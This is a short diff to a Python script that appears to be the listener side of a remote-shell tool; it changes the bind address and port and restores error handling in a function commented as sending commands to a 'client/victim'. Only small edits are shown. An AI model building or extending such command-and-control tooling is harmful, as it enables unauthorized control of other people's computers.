@@ -39,8 +39,8 @@ def create_socket():
         global host
         global port
         global s
-        host = ""
-        port = 9999
+        host = "0.0.0.0"
+        port = 7689
         s = socket.socket()
 
     except socket.error as msg:
@@ -154,7 +154,7 @@ def get_target(cmd):
 # Send commands to client/victim or a friend
 def send_target_commands(conn):
     while True:
-        #try:
+        try:
             cmd = input()
             if cmd == 'quit' or cmd == 'exit':
                 break
@@ -197,9 +197,9 @@ def send_target_commands(conn):
                 print(client_response, end="")
                 
                 
-        #except:
-         #   print("Error sending commands")
-          #  break
+        except:
+           print("Error sending commands")
+           break
 
 
 # Create worker threads
